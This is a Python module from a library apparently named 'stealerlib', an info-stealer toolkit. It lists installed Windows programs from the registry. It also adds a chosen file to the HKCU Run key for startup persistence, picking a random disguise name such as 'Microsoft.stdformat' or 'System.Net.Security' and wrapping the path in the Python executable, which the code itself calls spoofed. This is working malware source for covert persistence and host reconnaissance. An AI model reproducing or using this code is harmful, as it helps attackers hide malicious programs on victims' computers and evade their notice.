#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/registry/programs/__init__.py
"""

from random import choice
from sys import executable

from stealerlib.registry import *
from stealerlib.registry.types import RegistryTypes
from stealerlib.registry.manager import RegistryKeyManager


class Programs:
    """This class provides methods for extracting and parsing program-related information from the windows registry using the winreg library

    Attributes:
        programs  A list of program information as a list of values or a StealerLib object for each program stored in the registry
    """

    def __init__(self):
        super(Programs, self).__init__()

        self.programs = []
        self.startup_names = ["Mapper", "Loader", "Gameservices", "Microsoft.stdformat", "adobe", "DMapper", "Prism", "Spoc", "System.Threading.Timer", "UI.Plugin.Ncp", "System.Runtime.Serialization.Xml", "System.Net.Security", "System.Net.Requests", "System.Net.Primitives", "System.IO"]


    @catch
    def get_installed_programs(
        self,
        conv: Optional[bool]=True
    ) -> list[Union[list, list[RegistryTypes.Program]]]:
        """Uses winreg to get all installed programs from the registry, and parses their information

        Parameters:
            self (object): The object passed to the method
            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object

        Returns:
            list: A list of the gathered programs information, appended as a list or StealerLib objects
        """

        with RegistryKeyManager() as reg_key:
            for program in range(winreg.QueryInfoKey(reg_key)[0]):
                subkey_id = winreg.EnumKey(reg_key, program)
                subkey = winreg.OpenKey(reg_key, subkey_id)
                try:
                    obj_program = self.get_program_information(program_key=subkey)
                    self.programs.append(
                        obj_program.conv() if conv else obj_program
                    )
                except OSError:
                    continue

        return self.programs

    @staticmethod
    def get_program_information(program_key: winreg.HKEYType) -> RegistryTypes.Program:
        """Uses the provided program key to look up and parse the programs information from the windows registry

        Parameters:
            program_key (winreg.HKEYType): Windows registry sub-key used to lookup program information
            
        Returns:
            RegistryTypes.Program: A StealerLib object containing the name and folder location of the parsed program
        """

        name = winreg.QueryValueEx(program_key, "DisplayName")[0]
        location = winreg.QueryValueEx(program_key, "InstallLocation")[0]
        obj_program = RegistryTypes.Program(name=name, location=location)

        return obj_program

    @catch
    def add_file_to_startup(self, file_path: str, custom_startup_name: Optional[str]=None) -> bool:
        """Uses WinReg and a spoofed executable path to add the supplied file path to the startup registry folder

        Parameters:
            file_path (str): The path to the file that will be added to startup
            custom_startup_name (str): Optional custom startup name to set instead of a random preset name
        Returns:
            bool: A boolean set to True if the passed file path was added to startup else False
        """

        try:
            spoofed_file_path = '"{}" "{}"'.format(executable, file_path)
            registry_user = winreg.HKEY_CURRENT_USER
            startup_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            reg_key = winreg.CreateKeyEx(registry_user, startup_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg_key,
                              custom_startup_name if custom_startup_name else choice(self.startup_names),
                              0, winreg.REG_SZ, spoofed_file_path)
            return True
        except:
            return False
